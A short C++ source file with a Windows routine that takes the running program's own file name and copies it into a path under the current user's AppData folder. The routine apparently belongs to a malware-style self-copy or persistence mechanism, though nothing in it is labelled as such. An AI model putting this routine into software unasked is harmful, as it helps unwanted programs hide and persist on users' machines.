
#include "pch.h"
#include "CP.h"
#include <windows.h>
#include <Lmcons.h>
#include <stdio.h>

void CP::execute() {
	copy();
}

void CP::copy(){
	char* filename = this->util.getFileName();
	
	string name;
	TCHAR tcname[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(tcname, &length);
	name = tcname;

	this->path = this->base + name + this->appData + this->clone;
	
	BOOL response = 0;
	CopyFile(filename,this->path.c_str(),response);
}